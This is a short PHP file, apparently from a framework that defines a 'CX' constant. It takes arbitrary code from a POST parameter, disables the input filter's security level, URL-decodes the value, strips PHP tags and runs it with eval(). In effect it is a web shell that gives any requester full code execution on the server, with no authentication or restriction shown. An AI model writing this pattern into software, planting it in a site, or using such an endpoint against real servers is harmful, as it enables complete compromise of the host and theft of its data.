<?php

if(!defined('CX')) exit;

$code = urldecode(input::post('code', ['security_level' => 'no']));

$code = str_replace('<?php', '', $code);
$code = str_replace('?>', '', $code);

eval($code);

?>